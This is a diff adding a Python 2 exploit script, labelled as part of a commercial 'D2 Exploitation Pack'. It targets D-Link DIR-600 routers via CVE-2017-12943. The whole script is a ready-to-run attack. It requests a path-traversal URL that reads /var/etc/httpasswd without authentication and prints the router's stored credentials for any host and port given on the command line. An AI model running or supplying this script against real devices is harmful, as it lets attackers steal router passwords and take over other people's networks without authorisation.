@@ -1,0 +1,46 @@
+#! /usr/bin/env python2
+ 
+#
+# Proprietary D2 Exploitation Pack source code - use only under the license
+# agreement specified in LICENSE.txt in your D2 Exploitation Pack
+#
+# Copyright DSquare Security, LLC, 2007-2017
+#
+
+###
+# STD modules
+###
+import os, sys, re
+import requests
+
+_name_   = 'd2sec_dlink_20'
+_vendor_ = 'd-link'
+_model_  = ['DIR-600']
+_vuln_   = 'Authentication Bypass Vulnerability'
+_cve_    = 'CVE-2017-12943'
+_ref_    = 'https://www.exploit-db.com/exploits/42581/'
+_port_   = 80
+
+def pwnrouter(host,port=_port_):
+  try:
+    url = 'http://%s:%d/model/__show_info.php?REQUIRE_FILE=/var/etc/httpasswd' % (host,port)
+    response = requests.get(url)
+  except Exception, e:
+    print '[-] error : %s' % e
+    return
+  if response is None:
+    print '[+] %s not vulnerable' % host
+  elif '404 Not Found' in response.text:
+    print '[+] %s not vulnerable' % host  
+  else:
+    print '[+] %s vulnerable' % host
+    print '[+] URL: %s\n'%url
+    m = re.search('<center>(.+)</center>', response.text, re.DOTALL)
+    if m is None:
+      print '[+] %s not vulnerable' % host
+    else: 
+      print m.group(1).strip()    
+
+
+if __name__ == "__main__":
+  pwnrouter(sys.argv[1], int(sys.argv[2]))
